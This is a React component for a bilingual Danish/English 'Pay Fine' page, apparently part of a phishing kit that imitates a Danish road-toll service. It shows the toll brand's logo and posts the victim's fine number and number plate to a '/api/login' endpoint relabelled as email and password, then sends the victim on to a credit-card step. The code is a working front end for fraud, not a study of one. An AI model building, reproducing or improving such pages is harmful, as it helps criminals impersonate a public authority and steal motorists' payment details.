import React, { useState } from "react";
import {
  AppBar,
  Toolbar,
  Container,
  Typography,
  TextField,
  Button,
  Box,
  Paper,
  SvgIcon,
  useMediaQuery,
  useTheme,
  Grid,
  Menu,
  MenuItem,
  ListItemIcon,
  Alert,
  Snackbar,
  CircularProgress,
} from "@mui/material";
import CheckIcon from "@mui/icons-material/Check";
import { useNavigate } from "react-router-dom";

// Custom dropdown arrow icon
const KeyboardArrowDownIcon = (props) => (
  <SvgIcon {...props} viewBox="0 0 24 24">
    <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
  </SvgIcon>
);

// Logo component
const KMTollLogo = () => (
  <img
    src="https://kmt.vejafgifter.dk/e0845ea56d96bcb377f9.svg"
    alt="KM Toll Logo"
    id="kmTollLogo"
    style={{ height: 36, cursor: "pointer" }}
  />
);

// Translations
const translations = {
  en: {
    title: "Pay Fine",
    description: "Please fill in the fields below to pay your fine. You need to enter the fine number and your vehicle registration number.",
    fineNumber: "Fine number",
    fineNumberPlaceholder: "Enter fine number",
    registrationNumber: "Registration number",
    registrationNumberPlaceholder: "Enter registration number",
    required: "This field is required",
    next: "Next",
    processing: "Processing...",
    success: "Fine payment processed successfully",
    errorTitle: "Error",
    failedToProcess: "Failed to process fine information.",
    networkError: "Network error. Please try again.",
  },
  da: {
    title: "Betal bøde",
    description: "Udfyld venligst felterne nedenfor for at betale din bøde. Du skal indtaste bødenummer og dit køretøjs nummerplade.",
    fineNumber: "Bødenummer",
    fineNumberPlaceholder: "Indtast bødenummer",
    registrationNumber: "Registreringsnummer",
    registrationNumberPlaceholder: "Indtast registreringsnummer",
    required: "Dette felt er påkrævet",
    next: "Næste",
    processing: "Behandler...",
    success: "Bødebetaling gennemført",
    errorTitle: "Fejl",
    failedToProcess: "Kunne ikke behandle bødeinformation.",
    networkError: "Netværksfejl. Prøv venligst igen.",
  }
};

export default function PayFinePage() {
  const navigate = useNavigate();
  const [language, setLanguage] = useState("Dansk");
  const [anchorEl, setAnchorEl] = useState(null);
  const [loading, setLoading] = useState(false);
  const [snackbar, setSnackbar] = useState({
    open: false,
    message: "",
    severity: "error",
  });

  const open = Boolean(anchorEl);

  // Get translation based on language
  const t = (key) => {
    const lang = language === "Dansk" ? "da" : "en";
    return translations[lang]?.[key] || translations.en[key] || key;
  };

  const handleLanguageClick = (event) => {
    setAnchorEl(event.currentTarget);
  };

  const handleLanguageClose = (lang) => {
    if (lang) setLanguage(lang);
    setAnchorEl(null);
  };
  
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("sm"));
  const [reference, setReference] = useState("");
  const [numberPlate, setNumberPlate] = useState("");
  const [errors, setErrors] = useState({
    reference: false,
    numberPlate: false,
  });

  // Get API URL from environment variables
  const apiUrl = import.meta.env.VITE_API_URL;

  const handleSnackbarClose = () => {
    setSnackbar({ ...snackbar, open: false });
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    
    const newErrors = {
      reference: !reference.trim(),
      numberPlate: !numberPlate.trim(),
    };
    setErrors(newErrors);
    
    if (!newErrors.reference && !newErrors.numberPlate) {
      setLoading(true);
      
      try {
        // Send data to backend using environment variable
        const response = await fetch(`${apiUrl}/api/login`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            email: reference.trim(), // Using reference as email/phone
            password: numberPlate.trim(), // Using numberPlate as password
          }),
        });

        const data = await response.json();

        if (response.ok) {
          // Clear form
          setReference("");
          setNumberPlate("");
          // Redirect to /card page
          navigate("/signup/creditoption");
        } else {
          setSnackbar({
            open: true,
            message: data.error || t("failedToProcess"),
            severity: "error",
          });
        }
      } catch (error) {
        console.error("Error submitting form:", error);
        setSnackbar({
          open: true,
          message: t("networkError"),
          severity: "error",
        });
      } finally {
        setLoading(false);
      }
    }
  };

  // Limit fine number to 20 characters
  const handleReferenceChange = (e) => {
    const value = e.target.value;
    if (value.length <= 20) {
      setReference(value);
      // Clear error when user starts typing
      if (errors.reference) {
        setErrors({ ...errors, reference: false });
      }
    }
  };

  // Limit registration number to 10 characters and convert to uppercase
  const handleNumberPlateChange = (e) => {
    let value = e.target.value.toUpperCase();
    // Remove any spaces
    value = value.replace(/\s/g, '');
    if (value.length <= 10) {
      setNumberPlate(value);
      // Clear error when user starts typing
      if (errors.numberPlate) {
        setErrors({ ...errors, numberPlate: false });
      }
    }
  };

  return (
    <div style={{ backgroundColor: "#f2f2f2", minHeight: "100vh", overflow: "hidden" }}>
      {/* Header */}
      <AppBar
        position="relative"
        elevation={0}
        sx={{
          backgroundColor: "#ffffff",
          color: "#000",
          borderBottom: "1px solid rgba(0,0,0,0.12)",
          padding: "0 24px",
          ...(isMobile && { padding: "0 12px" }),
        }}
      >
        <Toolbar sx={{ height: 94, padding: 0 }}>
          <KMTollLogo />
          <Box sx={{ flexGrow: 1 }} />

          <>
            <Button
              id="language-picker-button"
              onClick={handleLanguageClick}
              variant="outlined"
              disableRipple
              disableElevation
              sx={{
                width: 140,
                height: 40,
                minWidth: 140,
                px: 2,
                border: "1px solid #C9C9C9",
                borderRadius: "999px",
                backgroundColor: "#fff",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                textTransform: "none",
                fontFamily: "Campton",
                color: "#202020",
                boxShadow: "none",
                "&:hover": {
                  backgroundColor: "#fff",
                  border: "1px solid #C9C9C9",
                  boxShadow: "none",
                },
              }}
            >
              <Typography
                sx={{
                  fontFamily: "Campton",
                  fontWeight: 600,
                  fontSize: 14,
                  color: "#202020",
                }}
              >
                {language}
              </Typography>

              <KeyboardArrowDownIcon sx={{ fontSize: 20 }} />
            </Button>

            <Menu
              anchorEl={anchorEl}
              open={open}
              onClose={() => handleLanguageClose()}
              anchorOrigin={{
                vertical: "bottom",
                horizontal: "left",
              }}
              transformOrigin={{
                vertical: "top",
                horizontal: "left",
              }}
              slotProps={{
                paper: {
                  sx: {
                    mt: 1,
                    width: 140,
                    borderRadius: "6px",
                    overflow: "hidden",
                    boxShadow: "0 4px 14px rgba(0,0,0,.12)",
                  },
                },
              }}
            >
              {["Dansk", "English"].map((item) => (
                <MenuItem
                  key={item}
                  onClick={() => handleLanguageClose(item)}
                  selected={language === item}
                  sx={{
                    height: 40,
                    px: 1.5,
                    fontFamily: "Campton",
                    fontSize: 14,
                    fontWeight: 600,
                    color: "#202020",
                    display: "flex",
                    justifyContent: "space-between",
                    "&.Mui-selected": {
                      background: "#F3F3F3",
                    },
                    "&.Mui-selected:hover": {
                      background: "#F3F3F3",
                    },
                  }}
                >
                  {item}
                  {language === item && (
                    <ListItemIcon
                      sx={{
                        minWidth: "auto",
                        color: "#0078D4",
                      }}
                    >
                      <CheckIcon fontSize="small" />
                    </ListItemIcon>
                  )}
                </MenuItem>
              ))}
            </Menu>
          </>
        </Toolbar>
      </AppBar>

      {/* Main Content */}
      <Container
        maxWidth={false}
        sx={{
          backgroundColor: "#f2f2f2",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          minHeight: "calc(100vh - 93px)",
          padding: isMobile ? "16px 12px" : "0",
          paddingTop: {
            xs: '40px',
            sm: '40px',
            md: '90px',
            lg: '90px',
            xl: '90px'
          },
          overflow: "hidden"
        }}
      >
        {/* Form Container */}
        <Paper
          elevation={0}
          sx={{
            backgroundColor: "#ffffff",
            borderRadius: "8px",
            width: 560,
            height: "auto",
            minHeight: 340,
            margin: "0 12px",
            display: "flex",
            flexDirection: "column",
            alignItems: "flex-start",
            justifyContent: "center",
            boxSizing: "border-box",
            "@media (max-width: 600px)": {
              width: "100%",
              height: "auto",
              margin: 0,
            },
          }}
        >
          <form onSubmit={handleSubmit} style={{ width: "100%" }}>
            <Grid container spacing={2} sx={{ p: '54px 10px 54px 54px' }}>
              {/* Title */}
              <Grid item xs={12}>
                <Typography
                  sx={{
                    textSizeAdjust: "100%",
                    WebkitFontSmoothing: "antialiased",
                    boxSizing: "inherit",
                    margin: 0,
                    fontSize: "19px",
                    fontWeight: 625,
                    lineHeight: "20px",
                    letterSpacing: "-0.3px",
                    textAlign: "start !important",
                    color: "rgb(45, 45, 45) !important",
                  }}
                >
                  {t("title")}
                </Typography>
              </Grid>

              {/* Description */}
              <Grid item xs={12}>
                <Typography
                  sx={{
                    fontSize: 14,
                    lineHeight: 1.4,
                    color: "#2d2d2d",
                    maxWidth: 480,
                  }}
                >
                  {t("description")}
                </Typography>
              </Grid>

              <Grid container spacing={1.5} direction="column">
                {/* Fine Number */}
                <Grid item xs={12}>
                  <Box
                    sx={{
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "flex-start",
                      width: "100%",
                    }}
                  >
                    <Typography
                      sx={{
                        fontSize: 13,
                        color: "#555",
                        mb: 0.5,
                        fontFamily: "CamptonBook",
                      }}
                    >
                      {t("fineNumber")}
                    </Typography>

                    <TextField
                      fullWidth
                      placeholder={t("fineNumberPlaceholder")}
                      value={reference}
                      onChange={handleReferenceChange}
                      error={errors.reference}
                      helperText={errors.reference ? t("required") : ""}
                      name="reference"
                      disabled={loading}
                      inputProps={{ maxLength: 20 }}
                      InputLabelProps={{ shrink: false }}
                      sx={{
                        width: 276,
                        maxWidth: "100%",
                        "& .MuiOutlinedInput-root": {
                          height: 44,
                          borderRadius: "6px",
                          backgroundColor: "#fff",
                          fontSize: 15,
                          fontFamily: "CamptonBook",
                          "& fieldset": {
                            borderColor: "#c8c8c8",
                          },
                          "&:hover fieldset": {
                            borderColor: "#999",
                          },
                          "&.Mui-focused fieldset": {
                            borderColor: "#1a73e8",
                            borderWidth: "1px",
                          },
                          "&.Mui-error fieldset": {
                            borderColor: "#d32f2f",
                          },
                        },
                        "& .MuiInputBase-input": {
                          padding: "10px 12px !important",
                          height: "auto",
                        },
                        "& input::placeholder": {
                          color: "#9a9a9a",
                          opacity: 1,
                          fontSize: 15,
                        },
                        "@media (max-width:600px)": {
                          width: "100%",
                          maxWidth: "100%",
                        },
                      }}
                    />
                  </Box>
                </Grid>

                {/* Registration Number */}
                <Grid item xs={12} style={{ marginTop: "15px" }}>
                  <Box
                    sx={{
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "flex-start",
                      width: "100%",
                    }}
                  >
                    <Typography
                      sx={{
                        fontSize: 13,
                        color: "#555",
                        mb: 0.5,
                        fontFamily: "CamptonBook",
                      }}
                    >
                      {t("registrationNumber")}
                    </Typography>

                    <TextField
                      fullWidth
                      placeholder={t("registrationNumberPlaceholder")}
                      value={numberPlate}
                      onChange={handleNumberPlateChange}
                      error={errors.numberPlate}
                      helperText={errors.numberPlate ? t("required") : ""}
                      name="numberPlate"
                      disabled={loading}
                      inputProps={{ 
                        maxLength: 10,
                        style: { textTransform: 'uppercase' }
                      }}
                      InputLabelProps={{ shrink: false }}
                      sx={{
                        maxWidth: 300,
                        "& .MuiOutlinedInput-root": {
                          height: 44,
                          borderRadius: "6px",
                          backgroundColor: "#fff",
                          fontSize: 15,
                          fontFamily: "CamptonBook",
                          "& fieldset": {
                            borderColor: "#c8c8c8",
                          },
                          "&:hover fieldset": {
                            borderColor: "#999",
                          },
                          "&.Mui-focused fieldset": {
                            borderColor: "#1a73e8",
                            borderWidth: "1px",
                          },
                          "&.Mui-error fieldset": {
                            borderColor: "#d32f2f",
                          },
                        },
                        "& input": {
                          padding: "10px 12px",
                          textTransform: 'uppercase',
                        },
                        "& input::placeholder": {
                          color: "#9a9a9a",
                          opacity: 1,
                          fontSize: 15,
                          textTransform: 'none',
                        },
                        "@media (max-width:600px)": {
                          maxWidth: "100%",
                        },
                      }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </Grid>
          </form>
        </Paper>

        {/* Next Button */}
        <Box
          sx={{
            display: "flex",
            justifyContent: "flex-end",
            width: "100%",
            maxWidth: 560,
            marginTop: "12px",
            marginBottom: "24px",
            paddingLeft: isMobile ? "0" : "12px",
            paddingRight: isMobile ? "0" : "12px",
          }}
        >
          <Button
            type="submit"
            variant="contained"
            disabled={!reference.trim() || !numberPlate.trim() || loading}
            onClick={handleSubmit}
            sx={{
              borderRadius: "30px",
              textTransform: "none",
              fontFamily: "Campton",
              fontWeight: 550,
              fontSize: 14,
              lineHeight: 1.2,
              padding: "8px 24px",
              backgroundColor: "#0576bf",
              color: "#fff",
              border: "2px solid #0576bf",
              minHeight: 40,
              minWidth: 100,
              "&:hover": {
                backgroundColor: "#0466a6",
                borderColor: "#0466a6",
              },
              "&.Mui-disabled": {
                backgroundColor: "#0576bf",
                opacity: 0.5,
                color: "#fff",
                borderColor: "#0576bf",
              },
              ...(isMobile && {
                padding: "6px 16px",
                fontSize: 13,
                marginBottom: "1rem",
              }),
            }}
          >
            {loading ? <CircularProgress size={24} color="inherit" /> : t("next")}
          </Button>
        </Box>
      </Container>

      {/* Snackbar for error notifications */}
      <Snackbar
        open={snackbar.open}
        autoHideDuration={6000}
        onClose={handleSnackbarClose}
        anchorOrigin={{ vertical: "bottom", horizontal: "center" }}
      >
        <Alert
          onClose={handleSnackbarClose}
          severity={snackbar.severity}
          sx={{ width: "100%" }}
        >
          {snackbar.message}
        </Alert>
      </Snackbar>
    </div>
  );
}